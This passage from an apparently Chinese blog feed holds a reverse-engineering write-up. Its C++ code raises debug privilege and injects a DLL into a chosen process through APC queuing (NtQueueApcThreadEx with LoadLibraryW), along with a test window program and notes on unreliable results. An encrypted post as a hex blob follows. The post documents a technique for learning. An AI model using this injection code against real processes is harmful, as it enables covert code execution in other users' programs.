class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;TlHelp32.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">NTSTATUS</span><span class="params">(*NtQueueApcThreadEx)</span></span></span><br><span class="line"><span class="function"><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">HANDLE thread,</span></span></span><br><span class="line"><span class="params"><span class="function">ULONG64 flag,</span></span></span><br><span class="line"><span class="params"><span class="function">ULONG64 NormalRoutine,</span></span></span><br><span class="line"><span class="params"><span class="function">ULONG64 NormalContext,</span></span></span><br><span class="line"><span class="params"><span class="function">ULONG64 s1,</span></span></span><br><span class="line"><span class="params"><span class="function">ULONG64 s2</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"><span class="built_in">NTSTATUS</span>(*pNtQueueApcThreadEx)</span><br><span class="line">(</span><br><span class="line">HANDLE thread,</span><br><span class="line">ULONG64 flag,</span><br><span class="line">ULONG64 NormalRoutine,</span><br><span class="line">ULONG64 NormalContext,</span><br><span class="line">ULONG64 s1,</span><br><span class="line">ULONG64 s2</span><br><span class="line">) = <span class="literal">NULL</span>;</span><br><span class="line">LPTHREAD_START_ROUTINE pLoadLibrary = <span class="literal">NULL</span>;</span><br><span class="line"><span class="function">BOOL <span class="title">EnableDebugPrivilege</span><span class="params">()</span> </span>&#123;</span><br><span class="line">HANDLE hToken;</span><br><span class="line">TOKEN_PRIVILEGES tp;</span><br><span class="line">LUID luid;</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ‰“å¼€å½“å‰è¿›ç¨‹çš„è®¿é—®ä»¤ç‰Œ</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">OpenProcessToken</span>(<span class="built_in">GetCurrentProcess</span>(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &amp;hToken)) &#123;</span><br><span class="line">std::cerr &lt;&lt; <span class="string">&quot;æ— æ³•æ‰“å¼€è¿›ç¨‹ä»¤ç‰Œã€‚é”™è¯¯: &quot;</span> &lt;&lt; <span class="built_in">GetLastError</span>() &lt;&lt; std::endl;</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// æŸ¥æ‰¾è°ƒè¯•ç‰¹æƒçš„LUID</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">LookupPrivilegeValue</span>(<span class="literal">NULL</span>, SE_DEBUG_NAME, &amp;luid)) &#123;</span><br><span class="line">std::cerr &lt;&lt; <span class="string">&quot;æ— æ³•æŸ¥æ‰¾è°ƒè¯•ç‰¹æƒçš„LUIDã€‚é”™è¯¯: &quot;</span> &lt;&lt; <span class="built_in">GetLastError</span>() &lt;&lt; std::endl;</span><br><span class="line"><span class="built_in">CloseHandle</span>(hToken);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// è®¾ç½®ç‰¹æƒ</span></span><br><span class="line">tp.PrivilegeCount = <span class="number">1</span>;</span><br><span class="line">tp.Privileges[<span class="number">0</span>].Luid = luid;</span><br><span class="line">tp.Privileges[<span class="number">0</span>].Attributes = SE_PRIVILEGE_ENABLED;</span><br><span class="line"></span><br><span class="line"><span class="comment">// è°ƒæ•´ç‰¹æƒ</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">AdjustTokenPrivileges</span>(hToken, FALSE, &amp;tp, <span class="built_in">sizeof</span>(TOKEN_PRIVILEGES), <span class="literal">NULL</span>, <span class="literal">NULL</span>)) &#123;</span><br><span class="line">std::cerr &lt;&lt; <span class="string">&quot;æ— æ³•è°ƒæ•´ä»¤ç‰Œç‰¹æƒã€‚é”™è¯¯: &quot;</span> &lt;&lt; <span class="built_in">GetLastError</span>() &lt;&lt; std::endl;</span><br><span class="line"><span class="built_in">CloseHandle</span>(hToken);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ£€æŸ¥è°ƒæ•´ç‰¹æƒçš„ç»“æœ</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">GetLastError</span>() == ERROR_NOT_ALL_ASSIGNED) &#123;</span><br><span class="line">std::cerr &lt;&lt; <span class="string">&quot;ä»¤ç‰Œä¸å…·æœ‰æŒ‡å®šçš„ç‰¹æƒã€‚é”™è¯¯: &quot;</span> &lt;&lt; <span class="built_in">GetLastError</span>() &lt;&lt; std::endl;</span><br><span class="line"><span class="built_in">CloseHandle</span>(hToken);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">CloseHandle</span>(hToken);</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//è·å–ç›®æ ‡pid-&gt;ç”³è¯·ç©ºé—´-&gt;å†™å…¥DLLè·¯å¾„-&gt;è·å–LoadLibraryåœ°å€-&gt;ç”¨APCæŒ‚é’©å‡½æ•°æŒ‚ä¸ŠLoadLibraryå‡½æ•°ï¼Œä¼ å‚DLLè·¯å¾„</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">PVOID <span class="title">getFunction</span><span class="params">(LPCSTR ModuleName, LPCSTR funcName, HMODULE&amp; hMoule)</span> </span>&#123;</span><br><span class="line">hMoule = <span class="built_in">GetModuleHandleA</span>(ModuleName);</span><br><span class="line"><span class="keyword">if</span> (!hMoule) &#123;</span><br><span class="line">std::cerr &lt;&lt; <span class="string">&quot;æ¨¡å—æ‰“å¼€å¤±è´¥&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">PVOID pfunc = <span class="built_in">GetProcAddress</span>(hMoule, funcName);</span><br><span class="line"><span class="keyword">if</span> (!pfunc) &#123;</span><br><span class="line">std::cerr &lt;&lt; <span class="string">&quot;å‡½æ•°æŸ¥æ‰¾å¤±è´¥&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> pfunc;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line"><span class="comment">//é˜²æ­¢è®¿é—®æƒé™ä¸å¤Ÿï¼Œä½¿ç”¨ä»¤ç‰Œæé«˜æƒé™</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">EnableDebugPrivilege</span>()) &#123;</span><br><span class="line">std::cerr &lt;&lt; <span class="string">&quot;è°ƒæ•´æƒé™å¤±è´¥&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//è·å–Ntdllå’ŒNtQueueApcThreadEx</span></span><br><span class="line">HMODULE hNtdll;</span><br><span class="line">pNtQueueApcThreadEx = (NtQueueApcThreadEx)<span class="built_in">getFunction</span>(<span class="string">&quot;Ntdll&quot;</span>, <span class="string">&quot;NtQueueApcThreadEx&quot;</span>, hNtdll);</span><br><span class="line"></span><br><span class="line"><span class="comment">//è·å–kernal32å’ŒLoadLibrary</span></span><br><span class="line">HMODULE hKernel32;</span><br><span class="line">pLoadLibrary = (LPTHREAD_START_ROUTINE)<span class="built_in">getFunction</span>(<span class="string">&quot;kernel32&quot;</span>, <span class="string">&quot;LoadLibraryW&quot;</span>, hKernel32);</span><br><span class="line"></span><br><span class="line"><span class="comment">//è·å–PID</span></span><br><span class="line">DWORD dwPid = <span class="number">0</span>;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;è¯·è¾“å…¥è¿›ç¨‹PIDï¼š&quot;</span>;</span><br><span class="line">std::cin &gt;&gt; dwPid;</span><br><span class="line">HANDLE hProcess = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, dwPid);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//ç”³è¯·ç©ºé—´</span></span><br><span class="line">WCHAR dllpath[] = <span class="string">L&quot;C:\\Users\\a2879\\source\\repos\\valentForAPCinject\\x64\\Debug\\messageboxDLL.dll&quot;</span>;</span><br><span class="line">LPVOID lpDLLpath = <span class="built_in">VirtualAllocEx</span>(hProcess, <span class="literal">NULL</span>, <span class="built_in">sizeof</span>(dllpath) + <span class="number">1</span>, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);</span><br><span class="line"><span class="keyword">if</span> (!lpDLLpath) &#123;</span><br><span class="line">std::cerr &lt;&lt; <span class="string">&quot;å†…å­˜åˆ†é…å¤±è´¥&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//å†™å…¥dllè·¯å¾„</span></span><br><span class="line">SIZE_T bytesWritten;</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">WriteProcessMemory</span>(hProcess, lpDLLpath, dllpath, <span class="built_in">sizeof</span>(dllpath) + <span class="number">1</span>, &amp;bytesWritten)) &#123;</span><br><span class="line">std::cerr &lt;&lt; <span class="string">&quot;å†™å…¥å¤±è´¥&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//å–çº¿ç¨‹</span></span><br><span class="line">DWORD dwThreadID;</span><br><span class="line">THREADENTRY32 te32 = &#123;&#125;;</span><br><span class="line">te32.dwSize = <span class="built_in">sizeof</span>(THREADENTRY32);</span><br><span class="line">HANDLE hSnapshot = <span class="built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPTHREAD, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">std::vector&lt;DWORD&gt; Vthread = &#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">Thread32First</span>(hSnapshot, &amp;te32)) &#123;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (te32.th32OwnerProcessID == dwPid) &#123;</span><br><span class="line">Vthread.<span class="built_in">push_back</span>(te32.th32ThreadID);</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">while</span> (<span class="built_in">Thread32Next</span>(hSnapshot, &amp;te32));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">auto</span> it = Vthread.<span class="built_in">rbegin</span>(); it != Vthread.<span class="built_in">rend</span>(); it++) &#123;</span><br><span class="line">HANDLE hThread = <span class="built_in">OpenThread</span>(THREAD_ALL_ACCESS, FALSE, te32.th32ThreadID);</span><br><span class="line"><span class="keyword">if</span> (hThread) &#123;</span><br><span class="line"><span class="built_in">pNtQueueApcThreadEx</span>(hThread, <span class="number">1</span>, (ULONG64)pLoadLibrary, (ULONG64)lpDLLpath, <span class="literal">NULL</span>, <span class="literal">NULL</span>);<span class="comment">//ç‰¹æ®Šç”¨æˆ·APC</span></span><br><span class="line"><span class="comment">//QueueUserAPC((PAPCFUNC)pLoadLibrary, hThread, (ULONG_PTR)lpDLLpath);//æ™®é€šç”¨æˆ·APC</span></span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;æˆåŠŸæ‰§è¡Œ:&quot;</span> &lt;&lt; *it &lt;&lt; std::endl;</span><br><span class="line"><span class="built_in">CloseHandle</span>(hThread);</span><br><span class="line"><span class="comment">//break;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">std::cerr &lt;&lt; <span class="string">&quot;æ— æ³•æ‰“å¼€çº¿ç¨‹\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;æ‰§è¡Œç»“æŸ&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ä»¥ä¸Šä»£ç é€šè¿‡åœ¨ç®¡ç†å‘˜æƒé™ä¸‹è¿è¡Œï¼Œç„¶ååˆ›å»ºä¸€ä¸ªå¸¦çª—å£çš„ç¨‹åºè¿›è¡Œæµ‹è¯•ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">LRESULT CALLBACK <span class="title">WindowProc</span><span class="params">(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)</span> </span>&#123;</span><br><span class="line"><span class="keyword">switch</span> (uMsg) &#123;</span><br><span class="line"><span class="keyword">case</span> WM_CREATE: &#123;</span><br><span class="line"><span class="built_in">CreateWindow</span>(</span><br><span class="line"><span class="string">L&quot;BUTTON&quot;</span>, <span class="string">L&quot;test&quot;</span>,</span><br><span class="line">WS_TABSTOP | WS_VISIBLE | WS_CHILD | BS_DEFPUSHBUTTON,</span><br><span class="line"><span class="number">10</span>, <span class="number">10</span>, <span class="number">100</span>, <span class="number">30</span>,</span><br><span class="line">hwnd, (HMENU)<span class="number">1</span>, <span class="built_in">GetModuleHandle</span>(<span class="literal">NULL</span>), <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">case</span> WM_COMMAND: &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">LOWORD</span>(wParam) == <span class="number">1</span>) &#123;</span><br><span class="line"><span class="built_in">SleepEx</span>(<span class="number">1000</span>, TRUE);<span class="comment">//è°ƒç”¨ä¼šè¿›è¡ŒAPCæ‰§è¡Œçš„å‡½æ•°ï¼Œtrueè¡¨æ˜ä¼šè¢«APCæ‰§è¡Œæ‰“æ–­ï¼Œä»è€Œäº§ç”Ÿæ•ˆæœ</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">case</span> WM_DESTROY: &#123;</span><br><span class="line"><span class="built_in">PostQuitMessage</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">DefWindowProc</span>(hwnd, uMsg, wParam, lParam);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> WINAPI <span class="title">WinMain</span><span class="params">(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, <span class="type">int</span> nCmdShow)</span> </span>&#123;</span><br><span class="line">WNDCLASS wc = &#123;&#125;;</span><br><span class="line">wc.lpfnWndProc = WindowProc;</span><br><span class="line">wc.hInstance = hInstance;</span><br><span class="line">wc.lpszClassName = <span class="string">L&quot;testForAPC&quot;</span>;</span><br><span class="line"><span class="built_in">RegisterClass</span>(&amp;wc);</span><br><span class="line"></span><br><span class="line">HWND hwnd = <span class="built_in">CreateWindowEx</span>(</span><br><span class="line"><span class="number">0</span>, <span class="string">L&quot;testForAPC&quot;</span>, <span class="string">L&quot;testForAPC&quot;</span>,</span><br><span class="line">WS_OVERLAPPEDWINDOW, CW_USEDEFAULT, CW_USEDEFAULT, <span class="number">640</span>, <span class="number">480</span>,</span><br><span class="line"><span class="literal">NULL</span>, <span class="literal">NULL</span>, hInstance, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">ShowWindow</span>(hwnd, nCmdShow);</span><br><span class="line"></span><br><span class="line">MSG msg = &#123;&#125;;</span><br><span class="line"><span class="keyword">while</span> (<span class="built_in">GetMessage</span>(&amp;msg, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="number">0</span>)) &#123;</span><br><span class="line"><span class="built_in">TranslateMessage</span>(&amp;msg);</span><br><span class="line"><span class="built_in">DispatchMessage</span>(&amp;msg);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¥½åƒæ˜¯æ¦‚ç‡æˆåŠŸï¼Œå’ŒAPCæ‰§è¡Œé æ¦‚ç‡æœ‰è”ç³»ã€‚åŒæ—¶å¥½åƒå¿…é¡»ç”¨çª—å£ç¨‹åºï¼Œå¦‚æœæ˜¯å‘½ä»¤è¡Œå°±ä¸€å®šä¸ä¼šè§¦å‘ã€‚ç»è¿‡å®æµ‹ï¼Œæ³¨å…¥åä¼šç›´æ¥æˆåŠŸè€Œä¸éœ€è¦è§¦å‘SleepExæˆ–è€…WaitingForSingleObjectä¹‹ç±»çš„å‡½æ•°,æ€€ç–‘æ˜¯çª—å£æœ¬èº«å› ç´ çš„å½±å“</p><hr><h2 id="æ²¡è§£å†³çš„é—®é¢˜">æ²¡è§£å†³çš„é—®é¢˜</h2><p>å…¶å®ƒç¨‹åºæ³¨å…¥åæ²¡æœ‰æ•ˆæœï¼Œ<br>ä¸çŸ¥é“ä¸ºä»€ä¹ˆè¦é€†åºæ³¨å…¥æ‰ä¸ä¼šå´©æºƒ</p>]]></content>
      
      
      <categories>
          
          <category> çŸ¥è¯†é›† </category>
          
          <category> é€†å‘ </category>
          
          <category> æŠ€èƒ½ </category>
          
          <category> DLLæ³¨å…¥ </category>
          
          <category> shellcodeæ³¨å…¥ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DLLæ³¨å…¥ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å½“æˆ‘åˆæƒ³èµ·-æœ¬ç«™ä¸€å‘¨å¹´çºªå¿µ</title>
      <link href="/posts/bdf313e6.html"/>
      <url>/posts/bdf313e6.html</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="879e383e20e0f4103f92f9784ffc6efc7ca17a4629e9d85864535bd00cec7e8c">2dd58a741cbda04d41d16d62701079d5e8f94df4584f0834cdb54f96c7cf3755b3eed8773510cda19ada81cc8e467e5d076a69180f63d31c43f40baaf00995bbe83d3e74b06298a831ccb6067af545152518f3675a50768ffa532ae20e861d03303d1a0523fbf549f5dd53055e0f25bb9f679f4c59534ac696a53e9993c9e2851b4db0eedf7432b4dba566026698f81adf63d2be5df657a9746d7917599a6c61dcc1c945b501fa1a1fac4b08924df9c11ff44d110c46b1a9c1073388d2e91b9040de70148de074044f464063b0ce358b90fca3a4e3fdbadef61fbb8e2ee14b32f7dfe8978c25dfae87409aa6aa6def3209155c96bcfd56157e793ca25e328bc6fb0b3028d335903fd2ea58b122b0dfbb4e31079ede9c86d6779cddf71ea7b45292a51accc07403f862343408a7756c81dd9fafa631195fdc6a3d03178ba034152bb54969db4f2ec586663a7d26162db1ef545bc44488dda2380107f095f3204951c855d67c0b3bf00a9cf478b89355275236a25bff6d114af868beb96e9ca0a33128fed8aa5dd85bac7390be31ddcc3544744c86960b3c0549f1a9a68286f07acfd0c0478759bcdd4a68acb006dba39cece5d33af6f7ab714d428c0e9d5d8e81e84d10a1bbddfef8622555597739a1a91713e51d7334c6afbb26770c20550ac46669ac880bc1e106ae497708909e01507801faa862ed5b0b6ab1f57131e35be8511724cd76858172afe19ad51688c9d99a84439ffc05a778016801ae82a0883a41494e4be0302723cb345900fd14c44494e20563c534e071d3513b01207ee21e50ffc4be2c74520b837227a41613f6c2eca9667e772ba8ea54ca584c57e28e91c1891c275bd0fdf911e13f44e677caa5ed8fee55495992acefed0963f9a7d4a6826939cfe5c9adef9f15a16fd0108b82c6118939bbfebc23752e2a7482aff8a9e88d69a56648e53e4eaee51d6e850c8cc0eb618bd33ef553adf3c3fb531336ec202d78f5c1a9eba458966d6847da9c57efefcbcea222d0dc61de46395120774ca238257ded34974c9ce60360fb3ecbd0aba3b7edef9d82d658100a7949396aae77e60691decf598dc3b7600fcb97cc4ae601a9a7fbd9ffae51fd96063a0339a54d7170619527b0e339eb490a0a5ed80446f4832a7aca392959a1e500d2cd8270ae32a23aacd2ec502321a43139e7723894125b18a7c9c0e63b57486c84f3284362dd07439039c65e9ec479d045b32e39cb7c731e2bd79ef6af1616b16b157b9684c88cbb761592bae7220f13be348805463e2e83f049008363afe444d59c85b220d9e2eafbe2e1970cc955dfab46d00eb4ea75cea130f956ad22a612d0e84dc6394fc8a058d8810c3f45a5d479974ae17f0802315a945208179e0c2a4bd8ecdecf78be7f35170af12ce55b748f40c5dff592d5ac00400430a678a8bcb74134f169292b585e07975f9bbfe8cba6e48b9acc3d2da5d228868feeafb3701b803748cb69d28c3a7adf1ccbc4fdd3d1ea6e78761301654df95b7e7ec1d7b694e9e56a84b513361e59c70c30f6838c49a248d65d750300857ef704aff8a966db8965f8270ef94389948aeb35ed5eee2ad6433d3c4c3f36e0969d8bd0a8efe3af49b47986331946acf9134791740631414daf36192aa9589eed5b011365a770cdbf3761e14c9df8879ed4dc216d74b4625c942683f437d7cfd9d4fe378198e9f4553f6e6d0c7808809cafb7ab1ab3b119e9e53b37462b122d36d985efd8b51f39e8834dadcc9ef934f9bc0a5fd8b244121f61bdcef6d01cd85071ec75bb5117e5e5a6673060d54e1f91430d7733ee5e47a0e9551e9cb5bce8625b14c66c876be668eae68451feadb4ed5fd13fd626fc9ae252a3bac5df366b4318ac71396db2382d14ffdf92bf396652b165a83d272399c8ff4ca234f61a239f1e5fbf8edd6dae56530567a4eef8dd44b7c6eb978b98daeb4058584bc9e0068f4b80dde2c864496b82f67da03805252cfc769a42aeca77b4f7c86bdd058f7aa7529b2214cfe070f0b8692b453bead8c6441c83a0a923b0ddf1fc73c304807752c7c94e555d7fe224080ccf90a5fb2ae70e519b6e1c2ccd962de838a5bd318fa8f3b95b62d81e5debf6bc542be42f3c253f3c2ca240f5147ca3e84dc659c69063d866221813b55fcc45ed4f23ab848096e7b4d9b6a6d12cfb3044f93d12e3d8f5f90b5e255d5071f5ec35284e638d9a9c535f07a78ce33e238f317a3d56e2862f2680c5e1d17e5e668c1364a6bdbc31a87e1a1ac730f341d66cccf2653c96a47141aef711a0b74f7e76afb6344768946716655fe4ffbe4ecc67824309372b900cb485186ab2e2c183e3c545b17e85d8727b33e026ce78da765c9e5cce7e7c9a882ac2a0d556062c0860e41ef7b10fc253c9a0f97924a4840430cc67c06af882b951796b34d3c627c364fbc447831c187fffb678bdbfd00d145847f76ec658f48f7e8cc2b4634214a3965613cc1d0c770e2ee718ed411769e27072ae6e423d577165bcd6925594ee9e58e3a246dbe7beb16ce2690e9b4d6dcebbe6588aaccf6bac409437f57a95f3a83450f1dc7796d520fa78e3fb8ea31c59653875917a4a77d724fc246120e4359b5045ecc941960bff9ea83bd83c7f910b3c085a4d70426875076f0fed8007bb42c4922c1f6fc4cba1ccc4864b07864bf4d028cedce5edfad8112611666cdeef67ca413b875981a62db6ac3707e75e38ab201b2dde6c7a7f1d66d44e47df25fb19a2f4e0249352f7263c584f0ea1318f668a45bd3456564f6afd22b90374ba3771fc485dd1b7c4c0afeb7ebdf67d34b92774d43a7276c70e601a8eadbbbc5ef9401751e7da93df8b8c72d6e03cfd9778c49c11f2d7ef5bea45e17cdcd6f724cc4751846ec5788ca65f90ff1fd4384fe2477c6ac0dfba6f5e20fc830fc835df36a9e09bd5fa51fa5a700bbc8112f3ed31a22fd1247dac8cf5e205e1109813a58994cddeb3af79b7a01ef92e392404f2247680bca023d1802f9fcc834cdf476ca35c5f2a2fbc24dfb53bc72ff093c56f71714fe9ca64a52fdf2fb3c46b4ea8d5e1754589cfcda31f26b56a7e82c2d0deee9b66fa66af9b28ce0e536fe36727c08618d36550afe7c1f16d2f9b38313bb895bf7e91c9f539ab607399e114a54d4333f62344b00d5bd2f5a10b5d0f825bed672fb1d613e23211d30fbb3f826953ac6df9dcd7924262f1b965b1006df95de5d2a0ded511911da383cffe14a56e4cb9de0a79d4b29f1c178acc19e4a4c9df9a6f97746ab02596a9b182247a190b40ab54adeff2b2af4fb4bf34e1561597c877d40f07ca2ee4aa7c461f729b51c6b5a69caecd496c7ba3cabb1549ea099e323986dbeaf0eab32a4e7b094faca3d07c819a844f259b2b79b9d75b72bc20a429020c650cdc2f5954c4eb68ee1095a0421d46e15a6e105f17e726f9858fb75b14166f47316e2aacdafe806dd32cd2efaa7c14451e489eb01ca5b5ef922a9c0d46438589fdb96e21adb4e6d04d2b03cf83718b607f199e92c6b2a20bd828f14af9190fef4565db33e6679a10e3a02075700bdbd4414353ddf67b7c9239f1ca50c05ec8d5a5f22f9431745f45fe108ae62cb24ba13e5ca6731e18fb24c8d8d89a4e51302903a0adcb392a901101f0404a2850712b949b38efbc70e6af8d1c2ee9c0848150a32861e2d3744cc304ff1fabd12680c9e234e053b1004a39e93cd6ccbf4296180673f713b47e972cb16ab4bfb7f897616ff9baa6ca0a551d52636efe79ef3d9b72b23966da07d2d640fa8289898081d65c68346091dbeac3ab5a6185666ba45aa6f447747dafc796381816773a2afdc056d9e62dc976eaec4fab9d06504eafdb0a1054bbc5d5d67316f76a307907b24c3504937dd14b02e503fab48600e8a945ab25a485b40fd3de156fb7bc7603119e2390b655e2bf0bea54cf076a077b131d71ec0123ba720921baf16c787e094e31789501530743bb736c19718d0bea29ecca8ec13caf0696d22ddf2f716b4ed5e75df4134a492e5cef084dce0bbe85f1bfc4af0b50c5bacc0095db0b2f607f4847d57c62571028dd10d84013447366c4d8e87b78299819f32395c00adaab57b80ca4d5309aa2124a94af02bcc6042f8bd46503c9e40e78113f47810501a7056df62d34728a00f264f91179fd00b650b98dac070caf22318b58a0265b9a496950e51289dbdbc9da96165de9b41262f7a07e88aef5c244e4ae06b2c4bb67914192b8ab6f0d6a4cfeb25071323f745b9801265e978fec99de864d69fd3df653d75e7721af9d9cdd76824610d4c5ff8d0ebb6a485616816a666799a9bb7fd6a9f997de9a4542f2408716c79a091f699b3ca80ed2b6f79feaa4bd268d2d6614209d78f0271278160f497ac6ac4c0f25ea663074677aad442bf87c5ac292c03b517fcd750ec08f5d